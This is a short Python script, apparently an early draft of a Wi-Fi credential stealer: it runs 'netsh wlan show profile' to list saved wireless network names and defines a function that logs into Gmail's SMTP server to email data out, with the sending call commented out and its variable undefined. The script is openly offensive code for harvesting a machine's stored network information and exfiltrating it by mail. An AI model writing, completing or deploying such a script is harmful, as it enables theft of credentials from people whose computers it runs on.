import subprocess, smtplib, re

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

commands = "netsh wlan show profile"
networks = subprocess.check_output(commands, shell=True)
network_name_lists = re.findall(b"(?:Profile\s*:\s)(.*)", networks)
for network_name in network_name_lists:
    print(network_name.decode("UTF-8"))
# send_mail("", "", message=result)